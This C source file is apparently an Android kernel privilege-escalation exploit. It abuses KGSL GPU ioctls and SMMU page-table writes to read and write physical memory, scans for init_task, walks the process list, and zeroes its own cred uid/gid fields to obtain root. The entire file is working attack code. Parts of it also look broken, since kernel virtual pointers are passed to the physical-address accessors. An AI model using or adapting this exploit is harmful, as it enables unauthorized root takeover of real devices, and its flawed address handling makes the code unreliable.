#include "gpu_physical_mem.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <android/log.h>
#include <stdint.h>
#include <inttypes.h>
#include <signal.h>
#include <setjmp.h>

#define TAG "GPUPHYSMEM"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)

#define mb()  __asm__ __volatile__("dsb sy" ::: "memory")
#define PAGE_SIZE 4096
#define TASK_COMM_LEN 16

// ===================== 扫描配置 =====================
#define SCAN_START_PA       0x100000ULL      // 1MB
#define SCAN_STEP_SIZE      0x10000ULL       // 64KB

// --------------------- 内核偏移候选列表（多版本兼容）---------------------
// 每项包含 { tasks_offset, pid_offset, comm_offset, cred_offset }
static const int OFFSET_CANDIDATES[][4] = {
        // Linux 4.19 (OPPO Reno5 常见)
        {0x2E0, 0x8C8, 0x8D0, 0x600},
        // Linux 5.4 (常见)
        {0x2F8, 0x8E0, 0x8E8, 0x618},
        // Linux 5.10
        {0x300, 0x8F0, 0x8F8, 0x628},
        // Linux 5.15
        {0x308, 0x900, 0x908, 0x630},
        // 通用回退 (旧内核)
        {0x2D8, 0x8B8, 0x8C0, 0x5F8},
};
#define NUM_OFFSET_SETS (sizeof(OFFSET_CANDIDATES) / sizeof(OFFSET_CANDIDATES[0]))

// 当前使用的有效偏移
static int g_tasks_offset = -1;
static int g_pid_offset = -1;
static int g_comm_offset = -1;
static int g_cred_offset = -1;

// 全局变量
static int kgsl_fd = -1;
static int ioctl_type = 0, ioctl_map_user_mem = 0, ioctl_gpu_command = 0;
static int context_id = 0;
static void *window_user_ptr = NULL;
static uint64_t window_gpuaddr = 0;
static uint64_t *l1_page_table = NULL;
static uint64_t l1_page_table_gpuaddr = 0;

// 信号处理跳转缓冲区 (用于非法物理地址访问)
static sigjmp_buf sig_jmpbuf;

static void sigsegv_handler(int sig) {
    siglongjmp(sig_jmpbuf, 1);
}

// -------------------------- SMMU 映射 --------------------------
static int send_smmu_update(uint64_t ttbr0_pa) {
    uint32_t cmds[4] = {0x80000003, 0x00000000,
                        (uint32_t)(ttbr0_pa & 0xFFFFFFFFULL),
                        (uint32_t)((ttbr0_pa >> 32) & 0xFFFFFFFFULL)};
    void *cmd_va = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (cmd_va == MAP_FAILED) return -1;
    memcpy(cmd_va, cmds, sizeof(cmds));

    struct kgsl_map_user_mem {
        unsigned long hostptr, len, gpuaddr;
        unsigned int memtype, flags, id;
    } map_req = {
            .hostptr = (unsigned long)cmd_va,
            .len = PAGE_SIZE,
            .memtype = 1,
            .flags = 0
    };
    if (ioctl(kgsl_fd, _IOWR(ioctl_type, ioctl_map_user_mem, sizeof(map_req)), &map_req) < 0) {
        munmap(cmd_va, PAGE_SIZE);
        return -1;
    }

    struct kgsl_gpu_command {
        unsigned int id, numcmds;
        void *cmds;
    } gpu_cmd = {
            .id = (unsigned int)context_id,
            .numcmds = 1,
            .cmds = (void *)map_req.gpuaddr
    };
    int ret = ioctl(kgsl_fd, _IOWR(ioctl_type, ioctl_gpu_command, sizeof(gpu_cmd)), &gpu_cmd);
    munmap(cmd_va, PAGE_SIZE);
    return ret;
}

static int map_phys_window(uint64_t phys_addr) {
    if (!l1_page_table) {
        LOGE("L1 page table not initialized");
        return -1;
    }
    if (window_gpuaddr == 0) {
        LOGE("window_gpuaddr is 0, cannot map");
        return -1;
    }
    int idx = (window_gpuaddr >> 21) & 0x1FF;
    l1_page_table[idx] = (phys_addr & ~0x1FFFFFULL) | 0x3;
    send_smmu_update(l1_page_table_gpuaddr);
    mb();
    usleep(500);
    return 0;
}

// -------------------------- 物理内存读写（带信号保护）--------------------------
static uint64_t phys_r64(uint64_t pa) {
    if (map_phys_window(pa) < 0) return 0;
    if (sigsetjmp(sig_jmpbuf, 1) != 0) {
        // 访问非法地址，返回0
        return 0;
    }
    signal(SIGSEGV, sigsegv_handler);
    uint64_t val = *(volatile uint64_t *)((uintptr_t)window_user_ptr + (pa & 0x1FFFFFULL));
    signal(SIGSEGV, SIG_DFL);
    return val;
}

static uint8_t phys_r8(uint64_t pa) {
    if (map_phys_window(pa) < 0) return 0;
    if (sigsetjmp(sig_jmpbuf, 1) != 0) return 0;
    signal(SIGSEGV, sigsegv_handler);
    uint8_t val = *(volatile uint8_t *)((uintptr_t)window_user_ptr + (pa & 0x1FFFFFULL));
    signal(SIGSEGV, SIG_DFL);
    return val;
}

static void phys_w64(uint64_t pa, uint64_t val) {
    if (map_phys_window(pa) < 0) return;
    if (sigsetjmp(sig_jmpbuf, 1) != 0) return;
    signal(SIGSEGV, sigsegv_handler);
    *(volatile uint64_t *)((uintptr_t)window_user_ptr + (pa & 0x1FFFFFULL)) = val;
    signal(SIGSEGV, SIG_DFL);
    mb();
}

// -------------------------- 初始化 --------------------------
int gpu_phys_init(int kgsl_fd_, int ioctl_type_, int _, int map_user_mem,
                  int gpu_command, int __, int ___, int context_id_) {
    kgsl_fd = kgsl_fd_;
    ioctl_type = ioctl_type_;
    ioctl_map_user_mem = map_user_mem;
    ioctl_gpu_command = gpu_command;
    context_id = context_id_;
    LOGI("✅ GPU 物理内存模块初始化成功");
    return 0;
}

void gpu_phys_setup_window(void *pt_va, uint64_t pt_gpuaddr,
                           uint64_t win_gpuaddr, void *window_user_ptr_) {
    l1_page_table = (uint64_t *)pt_va;
    l1_page_table_gpuaddr = pt_gpuaddr;
    window_gpuaddr = win_gpuaddr;
    window_user_ptr = window_user_ptr_;
    LOGI("✅ 物理映射窗口就绪 (window_gpuaddr=0x%llx)", (unsigned long long)window_gpuaddr);
}

// -------------------------- 获取物理内存上限 --------------------------
static uint64_t get_max_phys_addr(void) {
    uint64_t max_pa = 0;
    FILE *fp = fopen("/proc/iomem", "r");
    if (!fp) {
        return 0x80000000ULL;
    }
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        unsigned long long start, end;   // 使用 unsigned long long 类型
        if (sscanf(line, "%llx-%llx : System RAM", &start, &end) == 2) {
            if (end > max_pa) max_pa = (uint64_t)end;
        }
    }
    fclose(fp);
    return max_pa ? max_pa : 0x80000000ULL;
}

// -------------------------- 探测内核偏移 --------------------------
static int probe_kernel_offsets(uint64_t init_task_pa) {
    LOGI("🔍 探测内核 task_struct 偏移...");
    for (int i = 0; i < NUM_OFFSET_SETS; i++) {
        int tasks_off = OFFSET_CANDIDATES[i][0];
        int pid_off   = OFFSET_CANDIDATES[i][1];
        int comm_off  = OFFSET_CANDIDATES[i][2];
        int cred_off  = OFFSET_CANDIDATES[i][3];

        // 读取 tasks 指针
        uint64_t tasks = phys_r64(init_task_pa + tasks_off);
        if (tasks < 0xFFFFFFC000000000ULL) continue;

        // 读取 pid (应为0)
        uint32_t pid = (uint32_t)phys_r64(init_task_pa + pid_off);
        if (pid != 0) continue;

        // 读取 comm 字段，应包含 "swapper"
        char comm[16] = {0};
        for (int j = 0; j < 15; j++) {
            uint8_t c = phys_r8(init_task_pa + comm_off + j);
            if (c == 0) break;
            comm[j] = c;
        }
        if (!strstr(comm, "swapper")) continue;

        // 所有检查通过，使用此组偏移
        g_tasks_offset = tasks_off;
        g_pid_offset = pid_off;
        g_comm_offset = comm_off;
        g_cred_offset = cred_off;
        LOGI("✅ 偏移探测成功: tasks=0x%x, pid=0x%x, comm=0x%x, cred=0x%x",
             tasks_off, pid_off, comm_off, cred_off);
        return 0;
    }
    LOGE("❌ 未能探测到有效内核偏移，使用默认值 (可能失败)");
    // 使用第一组作为默认
    g_tasks_offset = OFFSET_CANDIDATES[0][0];
    g_pid_offset = OFFSET_CANDIDATES[0][1];
    g_comm_offset = OFFSET_CANDIDATES[0][2];
    g_cred_offset = OFFSET_CANDIDATES[0][3];
    return -1;
}

// -------------------------- init_task 合法性校验 --------------------------
static int is_valid_init_task(uint64_t pa) {
    if (g_tasks_offset == -1) {
        // 偏移尚未探测，使用宽松条件
        uint64_t tasks = phys_r64(pa + OFFSET_CANDIDATES[0][0]);
        if (tasks < 0xFFFFFFC000000000ULL) return 0;
        uint32_t pid = (uint32_t)phys_r64(pa + OFFSET_CANDIDATES[0][1]);
        return (pid == 0);
    }
    uint64_t tasks = phys_r64(pa + g_tasks_offset);
    if (tasks < 0xFFFFFFC000000000ULL) return 0;

    char comm[16] = {0};
    for (int i = 0; i < 15; i++) {
        uint8_t c = phys_r8(pa + g_comm_offset + i);
        if (c == 0) break;
        comm[i] = c;
    }
    if (!strstr(comm, "swapper")) return 0;

    uint32_t pid = (uint32_t)phys_r64(pa + g_pid_offset);
    return (pid == 0);
}

// -------------------------- 穷举 init_task --------------------------
static uint64_t find_init_task(void) {
    uint64_t end_pa = get_max_phys_addr();
    LOGI("🚀 开始穷举 init_task (物理地址范围: 0x%llx - 0x%llx, 步长 0x%llx)",
         (unsigned long long)SCAN_START_PA, (unsigned long long)end_pa, (unsigned long long)SCAN_STEP_SIZE);

    for (uint64_t pa = SCAN_START_PA; pa < end_pa; pa += SCAN_STEP_SIZE) {
        if ((pa & 0xFFFFFF) == 0) {
            LOGD("🔍 扫描物理地址 0x%llx", (unsigned long long)pa);
        }
        if (is_valid_init_task(pa)) {
            LOGI("🎉 找到 init_task 物理地址: 0x%llx", (unsigned long long)pa);
            // 找到后探测精确偏移
            probe_kernel_offsets(pa);
            return pa;
        }
    }
    LOGE("❌ 未找到 init_task，请检查扫描范围或内核偏移");
    return 0;
}

// -------------------------- 遍历进程链表找到当前进程 --------------------------
static uint64_t find_my_task_struct(uint64_t init_task_pa) {
    pid_t my_pid = getpid();
    char my_comm[TASK_COMM_LEN] = {0};

    FILE *fp = fopen("/proc/self/comm", "r");
    if (fp) {
        fgets(my_comm, TASK_COMM_LEN, fp);
        fclose(fp);
        my_comm[strcspn(my_comm, "\n")] = 0;
    } else {
        strcpy(my_comm, "vulnkit");
    }

    LOGI("🔍 查找当前进程: PID=%d | 进程名=%s", my_pid, my_comm);

    uint64_t current = phys_r64(init_task_pa + g_tasks_offset) - g_tasks_offset;
    int max_iter = 10000;
    while (max_iter-- > 0) {
        uint32_t pid = (uint32_t)phys_r64(current + g_pid_offset);
        char comm[TASK_COMM_LEN] = {0};
        for (int i = 0; i < TASK_COMM_LEN; i++) {
            comm[i] = phys_r8(current + g_comm_offset + i);
        }

        if (pid == my_pid && strstr(comm, my_comm)) {
            LOGI("🎉 找到当前进程的 task_struct 物理地址: 0x%llx", (unsigned long long)current);
            return current;
        }

        uint64_t next = phys_r64(current + g_tasks_offset) - g_tasks_offset;
        if (next == init_task_pa || next < 0xFFFFFFC000000000ULL) break;
        current = next;
    }
    LOGE("❌ 未找到当前进程的 task_struct");
    return 0;
}

// -------------------------- 提权 --------------------------
int gpu_phys_escalate_privileges(void) {
    if (getuid() == 0) {
        LOGI("✅ 已是 ROOT");
        return 0;
    }

    uint64_t init_task = find_init_task();
    if (!init_task) return -1;

    uint64_t task = find_my_task_struct(init_task);
    if (!task) return -1;

    uint64_t cred = phys_r64(task + g_cred_offset);
    LOGI("🚀 提权中 | cred 物理地址: 0x%llx", (unsigned long long)cred);

    // 将 uid, euid, suid, fsuid, gid 等清零
    phys_w64(cred + 0x4,  0);
    phys_w64(cred + 0x8,  0);
    phys_w64(cred + 0xC,  0);
    phys_w64(cred + 0x10, 0);
    phys_w64(cred + 0x14, 0);

    if (getuid() == 0) {
        LOGI("==================================================");
        LOGI("🎉 ROOT 权限获取成功！");
        LOGI("==================================================");
        return 0;
    }

    LOGE("❌ 提权失败");
    return -1;
}

// -------------------------- 废弃函数（保留接口）--------------------------
uint64_t gpu_phys_virt_to_phys(void *a) { return 0; }
int gpu_phys_read(uint64_t a, void *b, size_t c) { return 0; }
int gpu_phys_write(uint64_t a, const void *b, size_t c) { return 0; }
void gpu_phys_cleanup(void) {}